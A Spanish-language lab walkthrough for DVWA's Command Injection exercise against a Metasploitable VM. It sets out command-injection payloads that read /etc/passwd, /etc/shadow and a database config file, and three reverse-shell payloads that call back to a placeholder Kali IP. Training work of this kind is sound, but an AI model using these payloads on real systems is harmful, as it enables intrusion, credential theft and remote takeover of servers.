# LAB 06 — Command Injection (Ejecución de Comandos OS)
**DVWA → Command Injection → Security Level: Low**

---

## ¿Qué pide el PDF exactamente?

> "Muestre el payload y el proceso para provocar ejecución de comandos **no
> autorizados a nivel del sistema operativo** de la víctima, a través de la
> vulnerabilidad de Command Injection en DVWA"

El objetivo es demostrar que puedes ejecutar comandos del SO del servidor
(no solo de la aplicación web) usando el campo de ping de DVWA.

---

## Antes de empezar — checklist

```
[ ] Kali Linux con sesión: danielaguirre@kali:~$
[ ] DVWA abierto en Firefox: http://<IP_VICTIMA>/dvwa/
[ ] Login: admin / password
[ ] Security Level: LOW
[ ] Sabes la IP de Kali: ejecuta ip a (ej: 192.168.56.102)
[ ] Sabes la IP de Metasploitable: ejecuta ifconfig en Metasploitable
```

---

## ¿Qué está pasando por dentro?

El código PHP vulnerable de DVWA nivel Low está haciendo esto:
```php
$target = $_REQUEST['ip'];
$cmd = shell_exec('ping -c 4 ' . $target);
echo '<pre>' . $cmd . '</pre>';
```

`shell_exec()` pasa la cadena completa al `/bin/sh` del servidor. El shell
interpreta los metacaracteres **antes** de ejecutar. Entonces cuando mandas:
```
127.0.0.1 ; id
```
El servidor ejecuta literalmente:
```bash
ping -c 4 127.0.0.1 ; id
```
El `;` es un separador de comandos en bash: "ejecuta esto, Y LUEGO ejecuta esto otro".
El resultado de ambos comandos aparece en la página web.

---

## PARTE 1 — Confirmar la vulnerabilidad

### Paso 1 — Comportamiento legítimo (baseline)

Ir a:
```
http://<IP_VICTIMA>/dvwa/vulnerabilities/exec/
```

En el campo "Enter an IP address" escribe:
```
127.0.0.1
```
Click en Submit. Verás la salida normal del comando `ping`:
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.028 ms
...
```
Esto confirma que el servidor ejecuta el ping correctamente.

📸 **CAPTURA 1:** Formulario con `127.0.0.1` y el resultado del ping.

### Paso 2 — Primer payload: confirmar inyección con `id`

En el campo IP escribe exactamente:
```
127.0.0.1 ; id
```
> **Nota:** hay un espacio antes y después del `;`

Click en Submit. La respuesta incluye:
1. El resultado del ping (líneas de icmp)
2. El resultado del comando `id`:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

📸 **CAPTURA 2:** Página mostrando resultado del ping Y el uid del servidor.
Esta captura confirma la inyección — URL visible con el payload en el campo.

---

## PARTE 2 — Enumeración del sistema operativo

### Paso 3 — Información del kernel y SO

```
127.0.0.1 ; uname -a
```
Respuesta esperada:
```
Linux metasploitable 2.6.24-16-server #1 SMP ... i686 GNU/Linux
```
Esto revela: nombre del host, versión del kernel, arquitectura.

```
127.0.0.1 ; cat /etc/issue
```
Muestra la versión exacta del SO:
```
Ubuntu 8.04
```

### Paso 4 — Leer archivos sensibles del servidor

```
127.0.0.1 ; cat /etc/passwd
```
Lista todos los usuarios del sistema operativo con sus shells y directorios home.

```
127.0.0.1 ; cat /etc/shadow
```
Si `www-data` tiene permisos (en Metasploitable sí), muestra los hashes de
contraseñas de todos los usuarios del SO.

### Paso 5 — Explorar el sistema de archivos

```
127.0.0.1 ; ls -la /var/www/
```
Lista archivos del webroot. Aquí ves el código fuente completo de DVWA.

```
127.0.0.1 ; cat /var/www/dvwa/config/config.inc.php
```
Muestra usuario y contraseña de MySQL del servidor.

📸 **CAPTURA 3:** Cualquier archivo sensible mostrado (config.inc.php o shadow).

---

## PARTE 3 — Reverse Shell (máximo impacto)

Una reverse shell hace que el servidor víctima **se conecte activamente a Kali**
y le entregue una consola. Es la demostración de mayor impacto del ataque.

### ¿Por qué reverse y no bind shell?

Una bind shell abre un puerto en Metasploitable y Kali se conecta — los firewalls
bloquean conexiones entrantes. En reverse shell el servidor *sale* hacia Kali,
y las conexiones salientes casi nunca se bloquean.

### Paso 6 — Abrir el listener en Kali

Abre una terminal en Kali (distinta a la del navegador):
```bash
danielaguirre@kali:~$ nc -lvnp 4444
```
- `-l` → modo escucha (listen)
- `-v` → verbose (muestra info de conexiones)
- `-n` → no resolver DNS
- `-p 4444` → puerto donde espera

La terminal queda bloqueada esperando una conexión. No la cierres.

### Paso 7 — Payload de reverse shell

En el campo IP de DVWA:
```
127.0.0.1 ; nc -e /bin/bash <IP_KALI> 4444
```
Reemplaza `<IP_KALI>` con tu IP real de Kali (ej: `192.168.56.102`).

**¿Qué hace este comando?**
- `nc -e /bin/bash` → Netcat ejecutando bash como programa esclavo
- `<IP_KALI> 4444` → se conecta a Kali en el puerto 4444
- El resultado: Kali recibe una shell interactiva de Metasploitable

**Si Metasploitable no tiene `nc -e`** (versión OpenBSD de netcat):
```
127.0.0.1 ; bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1
```
Esta variante usa redirección de bash directamente al socket TCP.

**Variante con mkfifo (más compatible):**
```
127.0.0.1 ; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP_KALI> 4444 > /tmp/f
```

### Paso 8 — Interactuar con la shell recibida

En la terminal de Kali donde estaba `nc -lvnp 4444`, verás:
```
Connection received on 192.168.56.101 45231
```
Ya tienes una shell. Ejecuta comandos para confirmar:
```bash
whoami
# www-data

hostname
# metasploitable

uname -a
# Linux metasploitable 2.6.24-16-server...

pwd
# /var/www/dvwa/vulnerabilities/exec

cat /etc/shadow
```

📸 **CAPTURA 4:** Terminal de Kali mostrando la reverse shell con `whoami` y
`hostname` ejecutados. Esta es la captura de mayor impacto del laboratorio.

---

## PARTE 4 — Variantes de separadores (para el informe)

Todos estos funcionan en DVWA nivel Low. Úsalos para mostrar variedad técnica:

```
# AND lógico — ejecuta el segundo solo si el primero fue exitoso
127.0.0.1 && whoami

# OR lógico — ejecuta el segundo solo si el primero falló
999.999.999.999 || id

# Pipe — pasa salida del primero como input del segundo
127.0.0.1 | cat /etc/passwd

# Sustitución de comandos
127.0.0.1 ; echo "Servidor: $(hostname) | Usuario: $(whoami)"
```

📸 **CAPTURA 5 (opcional):** Variante con `&&` o `|` para mostrar comprensión
de los diferentes metacaracteres.

---

## Qué escribir en el campo IP del formulario

Referencia rápida de todos los payloads del lab:

```
# Confirmar vulnerabilidad
127.0.0.1 ; id

# Info del SO
127.0.0.1 ; uname -a
127.0.0.1 ; cat /etc/issue

# Archivos sensibles
127.0.0.1 ; cat /etc/passwd
127.0.0.1 ; cat /etc/shadow
127.0.0.1 ; cat /var/www/dvwa/config/config.inc.php

# Exploración
127.0.0.1 ; ls -la /var/www/
127.0.0.1 ; ps aux
127.0.0.1 ; ifconfig

# Reverse shell (con listener nc -lvnp 4444 en Kali)
127.0.0.1 ; bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1
```

---

## Troubleshooting

| Problema | Causa | Solución |
|---|---|---|
| El formulario no hace nada con el payload | El nivel de seguridad no es Low | DVWA Security → cambiar a Low → Submit |
| La reverse shell no conecta | IP de Kali incorrecta | Verificar con `ip a` en Kali |
| `nc -e` no disponible | Versión OpenBSD de netcat | Usar `bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1` |
| El listener se cierra solo | nc sin flags | Asegúrate de usar `nc -lvnp 4444` |
| El campo IP tiene validación en el navegador | JavaScript del lado cliente | Burp Suite → intercept → modificar el parámetro directo |

---

## Capturas mínimas para el informe

| # | Contenido | Por qué es importante |
|---|---|---|
| 1 | Ping normal con `127.0.0.1` | Muestra el comportamiento legítimo (baseline) |
| 2 | `127.0.0.1 ; id` con resultado `uid=33(www-data)` | **Prueba de la inyección** — captura principal |
| 3 | Archivo sensible leído (`passwd` o `config.inc.php`) | Muestra el impacto en confidencialidad |
| 4 | Reverse shell en Kali con `whoami` | Muestra el impacto máximo: control total del servidor |
